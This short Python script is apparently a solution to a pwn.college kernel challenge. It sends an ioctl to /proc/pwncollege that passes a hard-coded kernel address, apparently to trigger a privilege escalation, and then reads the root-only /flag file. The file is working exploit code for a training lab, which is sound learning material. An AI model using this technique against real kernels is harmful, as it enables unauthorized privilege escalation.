import fcntl
import os
import struct
#import pwn
from ctypes import *

fd = os.open('/proc/pwncollege', os.O_RDWR)
#arg = c_ulonglong(0xffffffffc000022d)
arg = struct.pack("<Q", 0xffffffffc000022d)
#arg = pwn.p64(0xffffffffc000022d)
fcntl.ioctl(fd, 0x539, *arg)
os.close(fd)
with open('/flag', 'r') as f:
    print(f.read())
